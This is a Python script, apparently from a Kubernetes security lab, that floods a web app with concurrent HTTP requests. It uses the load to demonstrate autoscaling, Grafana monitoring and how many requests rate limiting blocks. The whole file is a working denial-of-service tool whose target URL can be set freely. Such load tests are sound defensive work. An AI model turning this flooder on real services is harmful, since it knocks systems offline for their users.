#!/usr/bin/env python3
"""
attack_flood.py — HTTP flood (volumetric DoS) simulator.

Fires as many requests as possible to exhaust the app's resources.
Demonstrates: cpu/memory spike in Grafana, HPA scaling up replicas,
and the effect of rate-limiting and network policies.

Usage:
    python3 attack_flood.py --url http://localhost:30080 --workers 50 --duration 60
"""

import argparse
import threading
import time
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

class FloodStats:
    def __init__(self):
        self.lock = threading.Lock()
        self.total = 0
        self.success = 0
        self.rate_limited = 0
        self.errors = 0
        self.start = time.monotonic()

    def record(self, status: int):
        with self.lock:
            self.total += 1
            if 200 <= status < 400:
                self.success += 1
            elif status == 429:
                self.rate_limited += 1
            else:
                self.errors += 1

    def rps(self):
        elapsed = max(time.monotonic() - self.start, 0.001)
        return self.total / elapsed


def flood_worker(base_url: str, path: str, stats: FloodStats, stop_event: threading.Event):
    url = base_url.rstrip("/") + path
    while not stop_event.is_set():
        try:
            req = Request(url)
            with urlopen(req, timeout=3) as resp:
                stats.record(resp.status)
        except HTTPError as e:
            stats.record(e.code)
        except URLError:
            stats.record(0)


def main():
    parser = argparse.ArgumentParser(description="HTTP flood attack demo")
    parser.add_argument("--url", default="http://localhost:30080")
    parser.add_argument("--path", default="/", help="Path to flood")
    parser.add_argument("--workers", type=int, default=30)
    parser.add_argument("--duration", type=int, default=60)
    args = parser.parse_args()

    stats = FloodStats()
    stop_event = threading.Event()

    print(f"[*] HTTP Flood starting")
    print(f"[*] Target  : {args.url}{args.path}")
    print(f"[*] Workers : {args.workers}")
    print(f"[*] Duration: {args.duration}s")
    print(f"[*] Watch Grafana — you should see CPU spike and HPA scaling up pods")

    threads = []
    for _ in range(args.workers):
        t = threading.Thread(target=flood_worker,
                             args=(args.url, args.path, stats, stop_event),
                             daemon=True)
        t.start()
        threads.append(t)

    try:
        for elapsed in range(args.duration):
            time.sleep(1)
            with stats.lock:
                print(
                    f"\r[{elapsed+1:3d}s] rps={stats.rps():6.0f} "
                    f"ok={stats.success} rl={stats.rate_limited} err={stats.errors}",
                    end="", flush=True
                )
    except KeyboardInterrupt:
        print("\nInterrupted.")
    finally:
        stop_event.set()
        for t in threads:
            t.join(timeout=2)

    print(f"\n\n--- HTTP Flood Report ---")
    print(f"Total requests : {stats.total}")
    print(f"Avg RPS        : {stats.rps():.0f}")
    print(f"Success (2xx)  : {stats.success}")
    print(f"Rate limited(429): {stats.rate_limited}")
    print(f"Errors         : {stats.errors}")

    rl_pct = (stats.rate_limited / max(stats.total, 1)) * 100
    print(f"\nRate limiter blocked {rl_pct:.1f}% of flood traffic")


if __name__ == "__main__":
    main()
